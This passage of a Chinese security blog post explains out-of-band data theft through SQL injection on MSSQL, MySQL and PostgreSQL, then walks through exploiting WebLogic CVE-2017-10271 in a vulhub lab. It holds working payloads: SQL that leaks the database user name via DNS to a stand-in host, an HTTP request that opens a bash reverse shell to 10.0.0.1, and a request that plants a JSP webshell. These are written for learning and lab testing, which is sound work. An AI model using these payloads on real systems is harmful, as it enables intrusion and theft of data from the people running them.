+<h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a><strong>MSSQL</strong></h2><h3 id="检测-4"><a href="#检测-4" class="headerlink" title="检测"></a><strong>检测</strong></h3><p><strong>受害者</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_dirtree '\\oob.dnsattacker.com \' –</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180911/1536630213_5b971dc56df6b.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536630213_5b971dc56df6b.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<h3 id="利用-渗出-3"><a href="#利用-渗出-3" class="headerlink" title="利用/渗出"></a>利用/渗出</h3><p><strong>受害者</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> @<span class="keyword">data</span> <span class="built_in">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="keyword">data</span> = (<span class="keyword">SELECT</span> <span class="keyword">system_user</span>);</span><br><span class="line">EXEC('master..xp_dirtree "\\'+@data+'.oob.dnsattacker.com\foo$"');</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="https://image.3001.net/images/20180911/1536630249_5b971de9e1b13.png!small" alt="信息外带漏洞(OOB)利用技巧"></strong></p>
+<p><strong>限制条件：</strong>数据库用户须为sysadmin权限。</p>
+<p>类似地，创建DNS查询的其他方法包括：xp_fileexists，xp_subdirs，xp_getfiledetails，sp_add_jobstep</p>
+<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><h3 id="检测-5"><a href="#检测-5" class="headerlink" title="检测"></a><strong>检测</strong></h3><p><strong>受害者</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>, <span class="string">'oob.dnsattacker.com\\test.txt'</span>));</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180911/1536630280_5b971e0801570.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536630280_5b971e0801570.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<h3 id="利用-渗出-4"><a href="#利用-渗出-4" class="headerlink" title="利用/渗出"></a>利用/渗出</h3><p><strong>受害者</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>, (<span class="keyword">SELECT</span> <span class="keyword">HEX</span>(<span class="keyword">CONCAT</span>(<span class="keyword">user</span>(),<span class="string">"\n"</span>))), <span class="string">'.oob.dnsattacker.com\\test.txt'</span>));</span><br></pre></td></tr></table></figure>
+
+<p><strong>限制条件：</strong>数据库用户须具有Select，update和“文件”权限。</p>
+<p><a href="https://image.3001.net/images/20180911/1536630369_5b971e6170ead.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536630369_5b971e6170ead.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<h2 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h2><h3 id="检测-6"><a href="#检测-6" class="headerlink" title="检测"></a><strong>检测</strong></h3><p><strong>受害者</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> EXTENSION dblink;<span class="keyword">SELECT</span> dblink_connect(<span class="string">'host=oob.dnsattacker.com user=postgres password=password dbname=dvdrental'</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="https://image.3001.net/images/20180911/1536630396_5b971e7c06c88.png!small" alt="信息外带漏洞(OOB)利用技巧"></strong></p>
+<p><strong>限制条件：</strong>用户必须具有超级用户权限才能执行CREATE EXTENSION查询。</p>
+<h3 id="利用-渗出-5"><a href="#利用-渗出-5" class="headerlink" title="利用/渗出"></a>利用/渗出</h3><p><strong>受害者</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> table_output;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_output(<span class="keyword">content</span> <span class="built_in">text</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> temp_function()</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="built_in">VOID</span> <span class="keyword">AS</span> $$</span><br><span class="line"><span class="keyword">DECLARE</span> exec_cmd <span class="built_in">TEXT</span>;</span><br><span class="line"><span class="keyword">DECLARE</span> query_result <span class="built_in">TEXT</span>;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">SELECT</span> <span class="keyword">INTO</span> query_result (<span class="keyword">SELECT</span> <span class="keyword">encode</span>(convert_to(<span class="keyword">concat</span>(<span class="keyword">user</span>,<span class="string">'     '</span>), <span class="string">'UTF8'</span>),<span class="string">'hex'</span>));</span><br><span class="line">    exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.oob.dnsattacker.com\\\\foobar.txt\'';</span><br><span class="line">    <span class="keyword">EXECUTE</span> exec_cmd;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$ LANGUAGE plpgsql SECURITY DEFINER;</span><br><span class="line"><span class="keyword">SELECT</span> temp_function();</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180911/1536630425_5b971e9941425.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536630425_5b971e9941425.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<h2 id="使用DNS泄露数据的限制"><a href="#使用DNS泄露数据的限制" class="headerlink" title="使用DNS泄露数据的限制"></a>使用DNS泄露数据的限制</h2><blockquote>
+<p>域名最多可包含127个子域。</p>
+<p>每个子域最多只能包含63个字符长度。</p>
+<p>完整域名的最大长度为253个字符。</p>
+<p>DNS记录缓存为每个URL请求都添加了一个唯一值。</p>
+<p>DNS是明文通道，因此通过DNS提取的任何数据都将采用明文格式，并可供中间节点和DNS服务器缓存使用。因此，建议不要通过DNS泄露一些较为敏感的数据。</p>
+</blockquote>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2><p>环境： <a href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">搭建命令</span><br><span class="line">自动化编译环境</span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line">启动整个环境</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">删除整个环境</span><br><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3negbsl3j20z807qduq.jpg" alt></p>
+<p>发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/21 0&amp;gt;&amp;amp;1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3nlkogpjj20h805a7sc.jpg" alt></p>
+<p>成功获取shell：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3nfc5v70j20j806pjry.jpg" alt></p>
+<p>写入webshell（访问：<code>http://your-ip:7001/bea_wls_internal/test.jsp</code>）：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 638</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java</span>&gt;</span><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.io.PrintWriter"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"println"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">&lt;% out.print("test"); %&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"close"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3niax5h0j20rv0idwsa.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3nl7zmboj20ie03ox16.jpg" alt></p>
+<h2 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h2><p>环境： <a href="https://github.com/vulhub/vulhub/tree/master/weblogic/weak_password" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/weak_password</a></p>
+<h2 id="注入实战"><a href="#注入实战" class="headerlink" title="注入实战"></a>注入实战</h2><p><a href="https://zhuanlan.zhihu.com/p/23631785" target="_blank" rel="noopener">一次sql延时注入之dnslog的利用</a></p>
+<p> <a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">Dnslog在SQL注入中的实战</a></p>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/qq_27446553/article/details/78952010" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/78952010</a></p>
+<p><a href="https://www.freebuf.com/articles/database/183997.html" target="_blank" rel="noopener">OOB</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/13/2019-1-13-dnslog/" title="dnslog">https://wh0ale.github.io/2019/01/13/2019-1-13-dnslog/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/dns/" rel="tag"><i class="fa fa-tag"></i># dns</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/13/2019-1-13-上传漏洞/" rel="next" title="上传漏洞">
+                <i class="fa fa-chevron-left"></i> 上传漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/15/2019-1-15-智能合约/" rel="prev" title="智能合约">
+                智能合约 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#搭建Dnslog"><span class="nav-number">1.</span> <span class="nav-text">搭建Dnslog</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#windows常用payload："><span class="nav-number">2.</span> <span class="nav-text">windows常用payload：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux常用payload："><span class="nav-number">3.</span> <span class="nav-text">Linux常用payload：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#数据库payload"><span class="nav-number">4.</span> <span class="nav-text">数据库payload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#OOB信息外带漏洞"><span class="nav-number">5.</span> <span class="nav-text">OOB信息外带漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">5.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#设置：DNS-OOB查询基础架构"><span class="nav-number">5.2.</span> <span class="nav-text">设置：DNS/OOB查询基础架构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#先决条件"><span class="nav-number">5.2.1.</span> <span class="nav-text">先决条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤"><span class="nav-number">5.2.2.</span> <span class="nav-text">具体步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#系统命令注入：OOB"><span class="nav-number">5.3.</span> <span class="nav-text">系统命令注入：OOB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测"><span class="nav-number">5.3.1.</span> <span class="nav-text">检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-渗出"><span class="nav-number">5.3.2.</span> <span class="nav-text">利用/渗出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ICMP"><span class="nav-number">5.3.3.</span> <span class="nav-text">ICMP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP"><span class="nav-number">5.3.4.</span> <span class="nav-text">HTTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-使用Responder窃取哈希"><span class="nav-number">5.3.5.</span> <span class="nav-text">SMB [使用Responder窃取哈希]</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE：Out-of-Band"><span class="nav-number">5.4.</span> <span class="nav-text">XXE：Out of Band</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测-1"><span class="nav-number">5.4.1.</span> <span class="nav-text">检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-渗出-1"><span class="nav-number">5.4.2.</span> <span class="nav-text">利用/渗出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FTP"><span class="nav-number">5.4.3.</span> <span class="nav-text">FTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-窃取哈希"><span class="nav-number">5.4.4.</span> <span class="nav-text">SMB [窃取哈希]</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入"><span class="nav-number">5.5.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测-2"><span class="nav-number">5.5.1.</span> <span class="nav-text">检测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ORACLE"><span class="nav-number">5.6.</span> <span class="nav-text">ORACLE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测-3"><span class="nav-number">5.6.1.</span> <span class="nav-text">检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-渗出-2"><span class="nav-number">5.6.2.</span> <span class="nav-text">利用/渗出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSSQL"><span class="nav-number">5.7.</span> <span class="nav-text">MSSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测-4"><span class="nav-number">5.7.1.</span> <span class="nav-text">检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-渗出-3"><span class="nav-number">5.7.2.</span> <span class="nav-text">利用/渗出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL"><span class="nav-number">5.8.</span> <span class="nav-text">MYSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测-5"><span class="nav-number">5.8.1.</span> <span class="nav-text">检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-渗出-4"><span class="nav-number">5.8.2.</span> <span class="nav-text">利用/渗出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Postgresql"><span class="nav-number">5.9.</span> <span class="nav-text">Postgresql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测-6"><span class="nav-number">5.9.1.</span> <span class="nav-text">检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-渗出-5"><span class="nav-number">5.9.2.</span> <span class="nav-text">利用/渗出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用DNS泄露数据的限制"><span class="nav-number">5.10.</span> <span class="nav-text">使用DNS泄露数据的限制</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实战"><span class="nav-number">6.</span> <span class="nav-text">实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-10271"><span class="nav-number">6.1.</span> <span class="nav-text">CVE-2017-10271</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#weak-password"><span class="nav-number">6.2.</span> <span class="nav-text">weak_password</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入实战"><span class="nav-number">6.3.</span> <span class="nav-text">注入实战</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
